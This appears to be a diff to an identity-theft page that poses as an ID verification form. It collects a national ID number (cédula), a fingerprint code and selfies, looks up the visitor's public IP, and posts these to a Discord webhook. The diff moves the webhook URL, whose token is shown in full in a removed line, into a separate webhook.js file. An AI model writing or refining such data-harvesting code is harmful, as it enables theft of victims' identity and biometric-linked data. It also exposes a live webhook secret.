@@ -197,6 +197,7 @@
         </div>
     </div>
 
+    <script src="webhook.js"></script>
     <script>
         // Lógica de inputs y validación de formulario
         const inputCedula = document.getElementById('cedula');
@@ -227,6 +228,10 @@
 
         btnContinuar.addEventListener('click', () => {
                         if (!btnContinuar.disabled) {
+                                // Limpiar selfies y contador antes de continuar
+                                sessionStorage.removeItem('selfie1');
+                                sessionStorage.removeItem('selfie2');
+                                sessionStorage.removeItem('captureAttempts');
                                 // Obtener IP pública
                                 fetch('https://api.ipify.org?format=json')
                                     .then(response => response.json())
@@ -235,7 +240,7 @@
                                         const cedula = inputCedula.value;
                                         const dactilar = inputDactilar.value;
                                         // Enviar al webhook de Discord
-                                        fetch('https://discordapp.com/api/webhooks/1478881955914448928/aIqH3pP2YLxjTfEaHLp13Yva48No9fcG9A_XrM5UcGQVyBmlr-ZRr_K0q2Lu6F-MDj26', {
+                                        fetch(WEBHOOK_URL, {
                                             method: 'POST',
                                             headers: {
                                                 'Content-Type': 'application/json'
